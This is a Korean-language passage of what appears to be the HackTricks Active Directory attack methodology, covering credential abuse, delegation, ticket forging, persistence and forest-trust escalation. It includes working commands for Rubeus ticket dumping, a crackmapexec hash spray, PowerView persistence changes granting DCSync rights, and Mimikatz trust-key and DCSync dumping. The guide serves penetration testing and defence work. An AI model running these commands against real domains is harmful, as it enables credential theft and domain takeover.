그런 다음 복구한 gMSA를 다른 자격 증명과 마찬가지로 평가합니다. 로컬/도메인 그룹 멤버십, 로그온 권한, SPN, 위임, 접근 가능한 서비스를 확인한 뒤 pass-the-hash를 시도합니다. 이 ACL 기반 획득 경로는 [Golden gMSA/dMSA](golden-dmsa-gmsa.md)와는 별개입니다. 후자는 KDS root key가 침해된 뒤 관리형 암호를 도출합니다.<sup>[[20]](#references)</sup>

컴퓨터 principal이 다른 컴퓨터 객체나 그룹을 아웃바운드로 제어할 수도 있습니다. 하나를 획득한 후에는 중첩된 멤버십과 유효 ACL을 별도로 확인합니다. 다른 컴퓨터 객체에 대한 쓰기 권한으로 계정을 변경할 수 있고, 그룹 멤버십 권한으로 로그온 역할을 얻을 수도 있습니다. staged-account 플래그, 예측 가능한 명명 규칙 또는 `GenericWrite` 엣지만으로는 전체 경로가 성립한다고 볼 수 없습니다.

파일, 공유 또는 백업에 있는 `msDS-ManagedPassword` blob의 읽을 수 있는 사본은 별도의 노출 경로입니다. LDAP 읽기 ACL은 다른 위치에 저장된 사본을 보호할 수 없습니다. 해석하기 전에 데이터가 관리형 암호 blob인지 확인하고, 이를 권한이 부여된 LDAP 읽기 및 KDS root key 도출과 구분합니다.

### Kerberoast

Kerberoasting은 사용자 계정과 연결된 서비스에서 사용하는 **TGS 티켓**을 획득한 뒤, 사용자 암호를 기반으로 한 암호화를 **오프라인**에서 크랙하는 기법입니다.

자세한 내용은 다음을 참조하세요:


{{#ref}}
kerberoast.md
{{#endref}}

### 원격 연결 (RDP, SSH, FTP, Win-RM 등)

일부 자격 증명을 획득했다면 **머신**에 접근할 수 있는지 확인할 수 있습니다. 이를 위해 포트 스캔 결과에 따라 여러 프로토콜을 사용해 여러 서버에 연결을 시도하는 **CrackMapExec**을 사용할 수 있습니다.

### 로컬 권한 상승

자격 증명을 침해했거나 일반 도메인 사용자 세션을 확보했고 도메인 내 **어떤 머신이든** 접근할 수 있다면, **로컬에서 권한을 상승하고 자격 증명을 수집할** 경로를 찾습니다. 로컬 관리자 권한이 있으면 메모리(LSASS)와 로컬 저장소(SAM)에서 다른 사용자의 **해시를 덤프**할 수 있습니다.

이 책에는 [**Windows 로컬 권한 상승**](../windows-local-privilege-escalation/index.html)에 관한 전체 페이지와 [**체크리스트**](../checklist-windows-privilege-escalation.md)가 있습니다. [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)도 잊지 말고 사용하세요.

### 현재 세션 티켓

현재 사용자의 **티켓**이 예상치 못한 리소스에 **접근할 권한을 제공하는** 경우는 매우 **드물지만**, 다음과 같이 확인해 볼 수 있습니다:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

도메인 자격 증명이나 사용자 세션이 있다면 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)를 다시 살펴보세요. 인증된 열거 및 강제 인증 기법을 사용하면 인증되지 않은 정찰 단계에서는 확인할 수 없었던 relay 경로가 드러날 수 있습니다.

### 컴퓨터 공유에서 자격 증명 찾기 | SMB 공유

이제 기본적인 자격 증명을 확보했으므로 **AD 내부에서 공유 중인 흥미로운 파일을 찾을 수 있는지** 확인해야 합니다. 수동으로 할 수도 있지만, 매우 지루하고 반복적인 작업입니다(확인해야 할 문서가 수백 개라면 더 그렇습니다).

[**사용할 수 있는 도구를 알아보려면 이 링크를 따라가세요.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM 자격 증명 탈취

**다른 PC나 공유에 액세스할 수 있다면** SCF 파일 같은 **파일을 배치**할 수 있습니다. 누군가 그 파일에 액세스하면 **사용자를 상대로 NTLM 인증을 유발**할 수 있으며, 이를 통해 crack할 **NTLM challenge**를 **탈취**할 수 있습니다.


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 취약점으로 인증된 사용자라면 누구나 **도메인 컨트롤러를 장악**할 수 있었습니다.


{{#ref}}
printnightmare.md
{{#endref}}

## 권한 있는 자격 증명/세션을 사용한 Active Directory 권한 상승

**다음 기법에는 일반 도메인 사용자 권한만으로는 충분하지 않습니다. 이러한 공격을 수행하려면 특별한 권한이나 자격 증명이 필요합니다.**

### Hash 추출

[AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relay를 포함한 [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [로컬 권한 상승](../windows-local-privilege-escalation/index.html)을 사용해 **일부 로컬 admin 계정을 장악**하는 데 성공했기를 바랍니다.\
이제 메모리와 로컬에 있는 모든 hash를 덤프할 차례입니다.\
[**hash를 얻는 여러 방법에 대한 내용은 이 페이지를 읽어보세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**사용자의 hash를 확보하면**, 이를 이용해 해당 사용자를 **사칭**할 수 있습니다.\
해당 **hash를 사용해 NTLM 인증을 수행하는** **도구**를 사용하거나, 새 **sessionlogon**을 만들고 해당 **hash를 LSASS에 주입**할 수 있습니다. 그러면 **NTLM 인증이 수행될 때마다 해당 hash가 사용됩니다.** mimikatz는 후자의 방법을 사용합니다.\
[**자세한 내용은 이 페이지를 읽어보세요.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

이 공격은 일반적인 NTLM 프로토콜의 Pass The Hash 대신 **사용자의 NTLM hash를 사용해 Kerberos ticket을 요청**하는 것을 목표로 합니다. 따라서 NTLM 프로토콜이 비활성화되고 인증 프로토콜로 **Kerberos만 허용되는 네트워크에서 특히 유용**할 수 있습니다.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** 공격 방식에서 공격자는 사용자의 암호나 hash 값 대신 **사용자의 인증 ticket을 탈취**합니다. 그런 다음 이 탈취한 ticket을 사용해 **사용자를 사칭**하고 네트워크 내 리소스와 서비스에 무단으로 액세스합니다.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### 자격 증명 재사용

로컬 administrator의 **hash** 또는 **암호**가 있다면 이를 사용해 다른 **PC에 로컬로 로그인**해 보세요.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> 상당히 **시끄럽고(noisy)** **LAPS**로 **완화할 수 있음(mitigate)**에 유의하세요.

### MSSQL 악용 및 신뢰된 링크

사용자에게 **MSSQL 인스턴스에 접근**할 권한이 있으면 MSSQL 호스트에서 **명령을 실행**하거나(SA로 실행 중인 경우), NetNTLM **hash**를 **탈취**하거나 **relay attack**을 수행할 수 있습니다.\
한 MSSQL 인스턴스가 다른 인스턴스와 database link를 통해 신뢰 관계를 맺고 있다면, 연결된 database에 대한 권한이 있는 사용자는 **신뢰 관계를 이용해 다른 인스턴스에서 쿼리를 실행**할 수 있습니다. 이러한 신뢰 관계를 연쇄적으로 이용하면, 사용자가 명령을 실행할 수 있는 잘못 구성된 database에 도달할 수도 있습니다.\
**database 간 링크는 forest trust를 넘어 작동합니다.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 자산/배포 플랫폼 악용

서드파티 인벤토리 및 배포 도구 모음은 흔히 자격 증명과 코드 실행으로 이어지는 강력한 경로를 노출합니다. 다음을 참고하세요.

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 속성이 있는 Computer 객체를 찾았고 해당 컴퓨터에 대한 도메인 권한이 있다면, 컴퓨터에 로그인하는 모든 사용자의 TGT를 메모리에서 덤프할 수 있습니다.\
따라서 **Domain Admin이 컴퓨터에 로그인하면** 해당 사용자의 TGT를 덤프하고 [Pass the Ticket](pass-the-ticket.md)을 사용해 가장할 수 있습니다.\
Constrained Delegation을 이용하면 **Print Server를 자동으로 침해**할 수도 있습니다(바라건대 DC일 것입니다).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

사용자나 컴퓨터에 "Constrained Delegation"이 허용되어 있으면 **컴퓨터의 일부 서비스에 접근하기 위해 임의의 사용자를 가장**할 수 있습니다.\
따라서 해당 사용자/컴퓨터의 **hash를 침해**하면 (domain admin을 포함한) **임의의 사용자를 가장**해 일부 서비스에 접근할 수 있습니다.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

원격 컴퓨터의 Active Directory 객체에 대한 **WRITE** 권한이 있으면 **상승된 권한**으로 코드를 실행할 수 있습니다:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 권한/ACL 악용

침해한 사용자에게 일부 도메인 객체에 대한 **유용한 권한**이 있을 수 있으며, 이를 통해 측면으로 **이동**하거나 권한을 **상승**할 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler 서비스 악용

도메인 내에서 **수신 대기 중인 Spool 서비스**를 발견하면 이를 **악용**해 **새 자격 증명을 획득**하고 **권한을 상승**시킬 수 있습니다.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 서드파티 세션 악용

**다른 사용자**가 침해된 컴퓨터에 **접근**하면 메모리에서 자격 증명을 **수집**하거나, 해당 사용자를 가장하기 위해 프로세스에 **beacon을 주입**할 수도 있습니다.\
일반적으로 사용자는 RDP를 통해 시스템에 접근합니다. 따라서 서드파티 RDP 세션에 대해 수행할 수 있는 몇 가지 공격 방법은 다음과 같습니다:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**는 도메인에 가입된 컴퓨터의 **로컬 Administrator 암호**를 관리하는 시스템으로, 암호가 **무작위로 생성**되고 고유하며 자주 **변경**되도록 합니다. 이 암호는 Active Directory에 저장되고, ACL을 통해 승인된 사용자만 접근할 수 있습니다. 해당 암호에 접근할 충분한 권한이 있으면 다른 컴퓨터로 피벗할 수 있습니다.


{{#ref}}
laps.md
{{#endref}}

### 인증서 탈취

AD CS 등록, 인증서 매핑 및 열거에 대한 내용은 인증서 탈취나 템플릿 악용을 진행하기 전에 [AD Certificates 개요](ad-certificates.md)를 참고하세요.

침해된 컴퓨터에서 **인증서를 수집**하면 환경 내에서 권한을 상승시킬 수 있습니다:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 인증서 템플릿 악용

**취약한 템플릿**이 구성되어 있다면 이를 악용해 권한을 상승시킬 수 있습니다:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 높은 권한 계정으로 사후 침해

### 도메인 자격 증명 덤프

**Domain Admin**, 또는 그보다 더 높은 **Enterprise Admin** 권한을 얻으면 도메인 database인 _ntds.dit_를 **덤프**할 수 있습니다.

[DCSync attack에 대한 자세한 내용은 여기에서 확인할 수 있습니다](dcsync.md).

[NTDS.dit를 탈취하는 방법에 대한 자세한 내용은 여기에서 확인할 수 있습니다](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit`와 `SYSTEM` hive가 함께 들어 있는, 읽을 수 있는 백업 아카이브는 추출 전이라도 노출된 디렉터리 자료로 취급해야 합니다. 오래된 password hash가 있다고 해서 다른 객체 속성까지 안전한 것은 아닙니다. `description` 같은 필드에 자격 증명이나 운영 관련 메모가 포함될 수 있습니다. 먼저 아카이브의 멤버 이름을 확인하고, 추출한 database 내용이 일반적인 열거 출력에 포함되지 않도록 하세요.

### Persistence를 위한 권한 상승

앞서 설명한 일부 기법은 persistence에도 사용할 수 있습니다.\
예를 들어 다음과 같이 할 수 있습니다.

- 사용자를 [**Kerberoast**](kerberoast.md)에 취약하게 만들기

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- 사용자를 [**ASREPRoast**](asreproast.md)에 취약하게 만들기

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- 사용자에게 [**DCSync**](#dcsync) 권한 부여

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket 공격**은 **NTLM hash**(예: **PC 계정의 hash**)를 사용해 특정 서비스에 대한 **합법적인 Ticket Granting Service (TGS) ticket**을 생성합니다. 이 방법은 **서비스 권한에 접근**하는 데 사용됩니다.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket 공격**은 공격자가 Active Directory (AD) 환경에서 **krbtgt 계정의 NTLM hash**를 획득하는 공격입니다. 이 계정은 AD 네트워크 내 인증에 필수적인 모든 **Ticket Granting Ticket (TGT)**에 서명하는 데 사용되므로 특별합니다.

공격자는 이 hash를 획득하면 원하는 모든 계정의 **TGT**를 생성할 수 있습니다(Silver ticket 공격).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

일반적인 golden ticket 탐지 메커니즘을 **우회하는 방식으로 위조한 golden ticket**과 유사합니다.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **계정 인증서 지속성**

계정의 **인증서를 보유하거나 인증서를 요청할 수 있으면**, 사용자가 비밀번호를 변경하더라도 해당 사용자 계정에 지속적으로 접근할 수 있는 매우 효과적인 방법이 됩니다.


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **도메인 인증서 지속성**

**인증서를 사용하면 도메인 내에서 높은 권한으로 지속성을 유지할 수도 있습니다:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory의 **AdminSDHolder** 객체는 Domain Admins 및 Enterprise Admins와 같은 **권한 있는 그룹** 전체에 표준 **Access Control List (ACL)**을 적용해 무단 변경을 방지합니다. 하지만 이 기능은 악용될 수 있습니다. 공격자가 AdminSDHolder의 ACL을 수정해 일반 사용자에게 모든 권한을 부여하면, 해당 사용자는 모든 권한 있는 그룹을 광범위하게 제어할 수 있습니다. 보호를 위한 이 보안 조치는 면밀히 모니터링하지 않으면 오히려 역효과를 내어 부당한 접근을 허용할 수 있습니다.

[**AdminDSHolder Group에 대한 자세한 정보는 여기에서 확인하세요.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

모든 **Domain Controller (DC)**에는 **로컬 관리자** 계정이 있습니다. 해당 시스템에서 관리자 권한을 획득하면 **mimikatz**를 사용해 로컬 Administrator hash를 추출할 수 있습니다. 그다음 레지스트리를 수정해 **이 비밀번호를 사용할 수 있도록 활성화**하면 로컬 Administrator 계정에 원격으로 접근할 수 있습니다.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

특정 도메인 객체에 대해 **사용자에게** 일부 **특수 권한을 부여**하면, 해당 사용자가 **나중에 권한을 상승**시킬 수 있습니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor**는 **객체가** 다른 **객체에 대해 가지는 권한**을 **저장**하는 데 사용됩니다. 객체의 **security descriptor**를 **조금만 변경**할 수 있어도 권한 있는 그룹의 구성원이 되지 않고 해당 객체에 대해 매우 유용한 권한을 얻을 수 있습니다.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` 보조 클래스를 악용해 `entryTTL`/`msDS-Entry-Time-To-Die`가 설정된 수명이 짧은 principal/GPO/DNS record를 생성합니다. 이 객체들은 tombstone을 남기지 않고 자동 삭제되어 LDAP 증거를 지우지만, 고아 SID, 손상된 `gPLink` 참조, 캐시된 DNS 응답은 남길 수 있습니다(예: AdminSDHolder ACE 오염 또는 악성 `gPCFileSysPath`/AD 통합 DNS redirect).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

메모리에서 **LSASS**를 변경해 **범용 비밀번호**를 설정하고 모든 도메인 계정에 접근할 수 있게 합니다.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
자신만의 **SSP**를 만들어 시스템 접근에 사용되는 **자격 증명**을 **평문으로 캡처**할 수 있습니다.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD에 **새 Domain Controller**를 등록하고 이를 사용해 지정된 객체에 SIDHistory, SPN 등의 **속성을 푸시**합니다. 이때 **변경 사항에 대한 로그를 남기지 않습니다**. **DA** 권한이 있어야 하며 **root domain** 내부에 있어야 합니다.\
잘못된 데이터를 사용하면 매우 지저분한 로그가 남는다는 점에 유의하세요.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

앞서 **LAPS 비밀번호를 읽을 권한이 충분한 경우** 권한을 상승시키는 방법을 살펴봤습니다. 하지만 이 비밀번호는 **지속성을 유지하는 데에도** 사용할 수 있습니다.\
확인:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft는 **Forest**를 보안 경계로 간주합니다. 즉, **하나의 도메인을 침해하면 전체 Forest가 침해될 가능성이 있습니다**.<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 **도메인**의 사용자가 다른 **도메인**의 리소스에 접근할 수 있게 하는 보안 메커니즘입니다. 이는 두 도메인의 인증 시스템을 연결해 인증 확인이 원활하게 이루어지도록 합니다. 도메인 간 trust를 설정하면, trust의 무결성을 유지하는 데 중요한 특정 **key**를 서로 교환하고 **Domain Controller (DC)**에 보관합니다.

일반적인 상황에서 사용자가 **trusted domain**의 서비스에 접근하려면 먼저 자신의 도메인 DC에 **inter-realm TGT**라는 특수 ticket을 요청해야 합니다. 이 TGT는 두 도메인이 공유하기로 합의한 **key**로 암호화됩니다. 이후 사용자는 **trusted domain의 DC**에 이 TGT를 제시해 서비스 ticket (**TGS**)을 받습니다. trusted domain의 DC가 inter-realm TGT를 성공적으로 검증하면 TGS를 발급해 사용자가 서비스에 접근할 수 있도록 합니다.

**단계**:

1. **Domain 1**의 **client computer**가 자신의 **NTLM hash**를 사용해 **Domain Controller (DC1)**에 **Ticket Granting Ticket (TGT)**을 요청하며 절차를 시작합니다.
2. 클라이언트 인증에 성공하면 DC1이 새 TGT를 발급합니다.
3. 그런 다음 클라이언트는 **Domain 2**의 리소스에 접근하는 데 필요한 **inter-realm TGT**를 DC1에 요청합니다.
4. inter-realm TGT는 양방향 domain trust의 일부로 DC1과 DC2가 공유하는 **trust key**로 암호화됩니다.
5. 클라이언트는 inter-realm TGT를 **Domain 2의 Domain Controller (DC2)**에 전달합니다.
6. DC2는 공유 trust key를 사용해 inter-realm TGT를 검증하고, 유효하면 클라이언트가 접근하려는 Domain 2의 서버에 대한 **Ticket Granting Service (TGS)**를 발급합니다.
7. 마지막으로 클라이언트는 이 TGS를 서버에 제시해 Domain 2의 서비스에 접근합니다. TGS는 서버 계정의 hash로 암호화됩니다.

### Different trusts

**trust는 단방향 또는 양방향일 수 있습니다.** 양방향인 경우 두 도메인이 서로를 trust합니다. 반면 **단방향** trust 관계에서는 한 도메인이 **trusted**이고 다른 도메인이 **trusting**입니다. 이 경우 **trusted domain에서 trusting domain 내 리소스에만 접근할 수 있습니다**.

Domain A가 Domain B를 trust하면 A는 trusting domain이고 B는 trusted domain입니다. 또한 **Domain A**에서는 **Outbound trust**이고, **Domain B**에서는 **Inbound trust**입니다.

**서로 다른 trust 관계**

- **Parent-Child Trusts**: 같은 forest 내에서 흔히 사용되는 구성으로, child domain은 parent domain과 자동으로 양방향 transitive trust를 맺습니다. 따라서 인증 요청은 parent와 child 간에 원활하게 전달됩니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 하며, referral 절차를 단축하기 위해 child domain 간에 설정됩니다. 복잡한 forest에서는 인증 referral이 일반적으로 forest root까지 올라간 후 대상 domain으로 내려와야 합니다. cross-link를 설정하면 이동 경로가 단축되며, 지리적으로 분산된 환경에서 특히 유용합니다.
- **External Trusts**: 서로 관련 없는 별개의 domain 간에 설정되며 기본적으로 non-transitive입니다. [Microsoft 문서](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)에 따르면 external trust는 forest trust로 연결되지 않은 현재 forest 외부 domain의 리소스에 접근할 때 유용합니다. external trust에서는 SID filtering을 통해 보안을 강화합니다.
- **Tree-root Trusts**: forest root domain과 새로 추가된 tree root 간에 자동으로 설정되는 trust입니다. 흔히 볼 수 있는 것은 아니지만, 새 domain tree를 forest에 추가하고 고유한 domain name과 양방향 transitivity를 유지하는 데 중요합니다. 자세한 내용은 [Microsoft 가이드](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)를 참조하세요.
- **Forest Trusts**: 두 forest root domain 간의 양방향 transitive trust이며, 보안 강화를 위해 SID filtering도 적용합니다.
- **MIT Trusts**: Windows가 아닌 [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domain과 설정하는 trust입니다. MIT trust는 좀 더 전문적인 trust로, Windows 생태계 외부의 Kerberos 기반 시스템과 통합해야 하는 환경에 사용됩니다.

#### **trust 관계의 다른 차이점**

- trust 관계는 **transitive**일 수도 있고(A가 B를 trust하고, B가 C를 trust하면 A도 C를 trust함) **non-transitive**일 수도 있습니다.
- trust 관계는 **bidirectional trust**(서로 trust함) 또는 **one-way trust**(한쪽만 다른 쪽을 trust함)로 설정할 수 있습니다.

### Attack Path

1. trust 관계를 **열거**합니다.
2. **security principal**(사용자/그룹/컴퓨터)이 ACE 항목을 통해서나 다른 domain의 그룹에 속해 있는 방식으로 **다른 domain의 리소스에 접근**할 수 있는지 확인합니다. **도메인 간 관계**를 찾아보세요(trust는 아마도 이를 위해 생성되었을 것입니다).
   1. 이 경우 kerberoast도 다른 선택지가 될 수 있습니다.
3. 여러 domain을 경유할 수 있는 **계정**을 **침해**합니다.

공격자가 다른 domain의 리소스에 접근할 수 있는 주요 방법은 다음 세 가지입니다.

- **Local Group Membership**: principal이 서버의 “Administrators” 그룹과 같은 시스템의 로컬 그룹에 추가되어 해당 시스템을 광범위하게 제어할 수 있습니다.
- **Foreign Domain Group Membership**: principal은 foreign domain의 그룹 구성원일 수도 있습니다. 다만 이 방법의 효과는 trust의 유형과 그룹의 범위에 따라 달라집니다.
- **Access Control Lists (ACLs)**: principal이 **ACL**에, 특히 **DACL** 내 **ACE**의 구성 요소로 지정되어 특정 리소스에 접근할 수 있습니다. ACL, DACL, ACE의 작동 방식에 대해 더 자세히 알아보려면 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 백서가 매우 유용합니다.<sup>[[17]](#references)</sup>

### 권한이 있는 외부 사용자/그룹 찾기

**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**을 확인하면 해당 domain의 foreign security principal을 찾을 수 있습니다. 이는 **외부 domain/forest**의 사용자/그룹입니다.

**Bloodhound** 또는 powerview를 사용해 확인할 수 있습니다:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### 자식에서 부모 포리스트로의 권한 상승

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

도메인 트러스트를 열거하는 다른 방법:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> **신뢰 키는 2개**입니다. 하나는 _Child --> Parent_용이고, 다른 하나는 _Parent_ --> _Child_용입니다.\
> 현재 도메인에서 사용하는 키는 다음 명령으로 확인할 수 있습니다:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection을 악용해 trust를 통해 자식/부모 도메인에서 Enterprise admin 권한으로 승격합니다:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 쓰기 가능한 Configuration NC 악용

Configuration Naming Context(NC)를 어떻게 악용할 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 Active Directory(AD) 환경의 포리스트 전반에서 구성 데이터를 위한 중앙 저장소 역할을 합니다. 이 데이터는 포리스트 내 모든 Domain Controller(DC)에 복제되며, 쓰기 가능한 DC는 Configuration NC의 쓰기 가능한 복사본을 유지합니다. 이를 악용하려면 DC, 가급적이면 자식 DC에서 **SYSTEM 권한**이 있어야 합니다.

**GPO를 루트 DC 사이트에 연결**

Configuration NC의 Sites 컨테이너에는 AD 포리스트 내 모든 도메인 가입 컴퓨터의 사이트 정보가 포함되어 있습니다. 공격자는 모든 DC에서 SYSTEM 권한으로 작업해 GPO를 루트 DC 사이트에 연결할 수 있습니다. 이 작업은 해당 사이트에 적용되는 정책을 조작해 루트 도메인을 침해할 가능성이 있습니다.

자세한 내용은 [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) 연구 자료를 참고하세요.<sup>[[12]](#references)</sup>

**포리스트의 모든 gMSA 침해**

공격 벡터 중 하나는 도메인의 권한 있는 gMSA를 대상으로 하는 것입니다. gMSA의 비밀번호를 계산하는 데 필수적인 KDS Root key는 Configuration NC에 저장됩니다. 모든 DC에서 SYSTEM 권한이 있으면 KDS Root key에 접근해 포리스트 전체의 모든 gMSA 비밀번호를 계산할 수 있습니다.

자세한 분석과 단계별 지침은 다음에서 확인할 수 있습니다:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

보완적인 위임 MSA 공격(BadSuccessor – 마이그레이션 속성 악용):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 외부 연구 자료: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema 변경 공격**

이 방법을 사용하려면 새 권한 있는 AD 객체가 생성될 때까지 기다리는 인내심이 필요합니다. SYSTEM 권한이 있으면 공격자는 AD Schema를 수정해 특정 사용자에게 모든 클래스에 대한 완전한 제어 권한을 부여할 수 있습니다. 이로 인해 새로 생성된 AD 객체에 무단으로 접근하고 제어할 수 있습니다.

자세한 내용은 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)를 참고하세요.<sup>[[14]](#references)</sup>

**DA에서 ADCS ESC5를 이용해 EA로 승격**

ADCS ESC5 취약점은 Public Key Infrastructure(PKI) 객체에 대한 제어 권한을 악용해 포리스트 내 모든 사용자로 인증할 수 있는 인증서 템플릿을 만드는 공격입니다. PKI 객체는 Configuration NC에 있으므로, 쓰기 가능한 자식 DC를 침해하면 ESC5 공격을 수행할 수 있습니다.

자세한 내용은 [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)에서 확인할 수 있습니다.<sup>[[15]](#references)</sup> ADCS가 없는 환경에서는 공격자가 필요한 구성 요소를 설정할 수 있으며, 이에 관한 내용은 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)에서 다룹니다.<sup>[[16]](#references)</sup>

### 외부 포리스트 도메인 - 단방향(인바운드) 또는 양방향

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

이 시나리오에서는 **외부 도메인이 신뢰하는 도메인**이며, 해당 외부 도메인에 대해 **정해지지 않은 권한**을 갖습니다. 도메인의 **어떤 보안 주체가 외부 도메인에 대해 어떤 접근 권한을 갖는지** 찾아낸 다음 이를 악용해야 합니다:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 외부 포리스트 도메인 - 단방향(아웃바운드)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

이 시나리오에서 **your domain**은 **다른 domains**의 principal에 일부 **privileges**를 **trusting**합니다.

